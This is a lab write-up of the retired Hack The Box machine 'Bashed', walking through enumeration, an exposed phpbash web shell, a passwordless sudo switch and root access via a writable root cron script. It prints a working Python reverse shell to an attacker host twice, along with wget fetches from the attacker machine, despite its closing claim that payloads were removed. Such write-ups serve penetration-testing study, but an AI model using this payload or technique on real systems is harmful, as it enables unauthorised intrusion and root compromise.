# Hack The Box: Bashed (Retired)

- **Target:** Bashed  
- **Difficulty:** Easy (felt medium as first box)  
- **Date Completed:** September 16, 2025  
- **Notes:** All sensitive info redacted to comply with HTB Terms of Service.  
- **Tags:** #HTB #OSCP #PrivilegeEscalation #CronJobs #pspy #WebShell #Linux

---

## Initial Enumeration

### 1. Nmap Scan

nmap -sC -sV -p- --min-rate=1000 <target-ip>
Open port: 80/tcp

Service: Apache HTTPD 2.4.18 (Ubuntu)

HTTP Title: Arrexel's Development Site

Noticed a GitHub link on the site: https://github.com/Arrexel/phpbash

### 2. Web Discovery & Directory Enumeration
Accessed the site and explored links.

Used gobuster for directory brute-forcing:


gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-common.txt
Found interesting directories: /dev, /php, /uploads (others seemed generic).

/dev gave HTTP 301 but was accessible via browser.

Located the semi-interactive web shell at:
http://<target-ip>/dev/phpbash.php

Note: phpbash is a lightweight web shell for penetration testing (found on GitHub linked from the dev site).

## Foothold -  Web Shell Access
Accessed the web shell as www-data:

$whoami
www-data

$id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ls -lha /home
Found users: arrexel, scriptmanager, root
Explored user directories: suspected user flags would be in /home/arrexel or /home/scriptmanager.


## User Flag Capture
Navigated to /home/arrexel:

$cat /home/arrexel/user.txt
User flag captured: (redacted)

## Privilege Escalation
1. Initial Checks
Checked sudo permissions:
$sudo -l
# As www-data, can run commands as user scriptmanager without password
Switched user to scriptmanager:


$sudo -u scriptmanager /bin/bash
$whoami
scriptmanager
$sudo -l
scriptmanager requires password; no root permissions granted.

2. Cronjob Enumeration with pspy
Downloaded and ran pspy64 to monitor cron jobs in real time.

Reverse Shell from Target Machine:
$uname -a
Target machine has 64 bit OS. Hence download PSPY64
$which curl
curl not available in target machine
$which wget
wget available. Hence using wget to download PSPY64 from attacker machine

Attacker machine Terminal:
$wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
Set the HTTP server running in attacker side
$python -m http.server 8000

Reverse Shell from Target Machine:
$wget http://$Attacker_IP:8000/pspy64 -O pspy64
$./pspy64

Discovered:

Cron runs /scripts/test.py as root every minute.

/scripts directory is writable.

test.py creates/overwrites test.txt with root privileges.

3. Exploiting Cron for Root Shell
Edited /scripts/test.py to include a reverse shell payload (Python):


import socket, subprocess, os
s = socket.socket()
s.connect(("<attacker-ip>", <port>))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash"])
Set up nc -lvnp <port> listener on attacker machine.

After cron ran the modified script, got a root shell.

## Root Flag Capture
Accessed root directory:


cd /root
cat root.txt
Root flag captured: (redacted)

## Learnings & Reflections
Web shells like phpbash can give powerful footholds.

sudo -u <user> without a password can be a privilege escalation path.

pspy is invaluable for real-time cron/job enumeration.

Writable root cron scripts are critical escalation vectors.

Upgrading shells with Python pty.spawn makes interaction easier.

Always check cronjobs and scripts for abuse opportunities in Linux pentesting.

⚠️ Note: All IPs, flags, and direct exploit payloads have been removed or redacted to comply with Hack The Box's Terms of Service and responsible disclosure guidelines.

Appendix
Useful Commands Summary
Nmap scan:
nmap -sC -sV -p- --min-rate=1000 <target-ip>

Gobuster directory enumeration:
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

Switch user without password:
sudo -u scriptmanager /bin/bash

Reverse shell python payload for cron job (replace IP and port):
import socket, subprocess, os
s = socket.socket()
s.connect(("<attacker-ip>", <port>))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash"])
Tags
#HTB #OSCP #WebShell #PrivilegeEscalation #CronJobs #pspy #Linux #Writeup